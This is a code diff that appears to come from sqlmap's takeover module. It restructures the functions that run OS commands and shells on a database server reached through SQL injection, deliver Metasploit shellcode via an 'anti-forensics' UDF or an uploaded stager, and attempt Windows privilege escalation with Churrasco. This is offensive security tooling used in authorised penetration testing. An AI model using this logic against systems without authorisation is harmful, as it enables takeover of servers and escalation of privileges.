@@ -84,10 +84,10 @@ class Takeover(Abstraction, Metasploit, Registry):
             logger.info(infoMsg)
 
             self.webInit()
-            self.webBackdoorRunCmd(conf.osCmd)
         else:
             self.initEnv()
-            self.runCmd(conf.osCmd)
+
+        self.runCmd(conf.osCmd)
 
     def osShell(self):
         stackedTest()
@@ -97,12 +97,14 @@ class Takeover(Abstraction, Metasploit, Registry):
             logger.info(infoMsg)
 
             self.webInit()
-            self.webBackdoorShell()
         else:
             self.initEnv()
-            self.absOsShell()
+
+        self.shell()
 
     def osPwn(self):
+        goUdf = False
+
         stackedTest()
 
         if not kb.stackedTest:
@@ -116,77 +118,71 @@ class Takeover(Abstraction, Metasploit, Registry):
                 self.getRemoteTempPath()
                 self.createMsfPayloadStager()
                 self.uploadMsfPayloadStager(web=True)
+        else:
+            self.initEnv()
+            self.getRemoteTempPath()
 
-            self.pwn()
+            if kb.dbms in ( "MySQL", "PostgreSQL" ):
+                msg  = "how do you want to execute the Metasploit shellcode "
+                msg += "on the back-end database underlying operating system?"
+                msg += "\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)"
+                msg += "\n[2] Stand-alone payload stager (file system way)"
 
-            return
+                while True:
+                    choice = readInput(msg, default=1)
 
-        self.initEnv()
-        self.getRemoteTempPath()
+                    if isinstance(choice, str) and choice.isdigit() and int(choice) in ( 1, 2 ):
+                        choice = int(choice)
+                        break
 
-        goUdf = False
+                    elif isinstance(choice, int) and choice in ( 1, 2 ):
+                        break
 
-        if kb.dbms in ( "MySQL", "PostgreSQL" ):
-            msg  = "how do you want to execute the Metasploit shellcode "
-            msg += "on the back-end database underlying operating system?"
-            msg += "\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)"
-            msg += "\n[2] Stand-alone payload stager (file system way)"
+                    else:
+                        warnMsg = "invalid value, valid values are 1 and 2"
+                        logger.warn(warnMsg)
 
-            while True:
-                choice = readInput(msg, default=1)
+                if choice == 1:
+                    goUdf = True
 
-                if isinstance(choice, str) and choice.isdigit() and int(choice) in ( 1, 2 ):
-                    choice = int(choice)
-                    break
+            if goUdf:
+                self.createMsfShellcode(exitfunc="thread", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
+            else:
+                self.createMsfPayloadStager()
+                self.uploadMsfPayloadStager()
 
-                elif isinstance(choice, int) and choice in ( 1, 2 ):
-                    break
+            if kb.os == "Windows" and conf.privEsc:
+                if kb.dbms == "MySQL":
+                    debugMsg  = "by default MySQL on Windows runs as SYSTEM "
+                    debugMsg += "user, no need to privilege escalate"
+                    logger.debug(debugMsg)
 
-                else:
-                    warnMsg = "invalid value, valid values are 1 and 2"
+                elif kb.dbms == "PostgreSQL":
+                    warnMsg  = "by default PostgreSQL on Windows runs as postgres "
+                    warnMsg += "user which has no Windows Impersonation "
+                    warnMsg += "Tokens: it is unlikely that the privilege "
+                    warnMsg += "escalation will be successful"
                     logger.warn(warnMsg)
 
-            if choice == 1:
-                goUdf = True
-
-        if goUdf:
-            self.createMsfShellcode(exitfunc="thread", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
-        else:
-            self.createMsfPayloadStager()
-            self.uploadMsfPayloadStager()
-
-        if kb.os == "Windows" and conf.privEsc:
-            if kb.dbms == "MySQL":
-                debugMsg  = "by default MySQL on Windows runs as SYSTEM "
-                debugMsg += "user, no need to privilege escalate"
-                logger.debug(debugMsg)
-
-            elif kb.dbms == "PostgreSQL":
-                warnMsg  = "by default PostgreSQL on Windows runs as postgres "
-                warnMsg += "user which has no Windows Impersonation "
-                warnMsg += "Tokens: it is unlikely that the privilege "
-                warnMsg += "escalation will be successful"
-                logger.warn(warnMsg)
-
-            elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
-                warnMsg  = "often Microsoft SQL Server %s " % kb.dbmsVersion[0]
-                warnMsg += "runs as Network Service which has no Windows "
-                warnMsg += "Impersonation Tokens within all threads, this "
-                warnMsg += "makes Meterpreter's incognito extension to "
-                warnMsg += "fail to list tokens"
-                logger.warn(warnMsg)
-
-                uploaded = self.uploadChurrasco()
-
-                if not uploaded:
-                    warnMsg  = "beware that the privilege escalation "
-                    warnMsg += "might not work"
+                elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
+                    warnMsg  = "often Microsoft SQL Server %s " % kb.dbmsVersion[0]
+                    warnMsg += "runs as Network Service which has no Windows "
+                    warnMsg += "Impersonation Tokens within all threads, this "
+                    warnMsg += "makes Meterpreter's incognito extension to "
+                    warnMsg += "fail to list tokens"
                     logger.warn(warnMsg)
 
-        else:
-            # Unset --priv-esc if the back-end DBMS underlying operating
-            # system is not Windows
-            conf.privEsc = False
+                    uploaded = self.uploadChurrasco()
+
+                    if not uploaded:
+                        warnMsg  = "beware that the privilege escalation "
+                        warnMsg += "might not work"
+                        logger.warn(warnMsg)
+
+            else:
+                # Unset --priv-esc if the back-end DBMS underlying operating
+                # system is not Windows
+                conf.privEsc = False
 
         self.pwn(goUdf)
 
